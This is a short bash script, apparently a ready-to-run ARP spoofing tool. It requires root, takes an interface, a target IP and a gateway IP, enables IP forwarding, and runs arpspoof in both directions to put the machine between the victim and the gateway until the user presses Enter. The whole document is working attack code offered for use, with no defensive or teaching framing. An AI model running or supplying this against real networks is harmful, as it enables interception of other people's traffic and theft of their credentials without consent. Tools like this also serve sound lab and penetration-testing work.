#! /bin/bash

if [[ $EUID -ne 0 ]]
then
    echo "Please become a superuser"
    exit 1
fi
if [[ $# -ne 3 ]]
then
    echo "example : ./bash.sh eth0 192.168.100.202 192.168.100.1"
    exit 1
fi
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -i $1 -t $2 $3 > /dev/null 2>&1 &
PID1=$!
arpspoof -i $1 -t $3 $2 > /dev/null 2>&1 &
PID2=$!
echo "ARP spoofing is working properly; press enter to stop"
read
kill -9 $PID1 $PID2
echo 0 > /proc/sys/net/ipv4/ip_forward

echo "arp spoof is finished"
exit 0
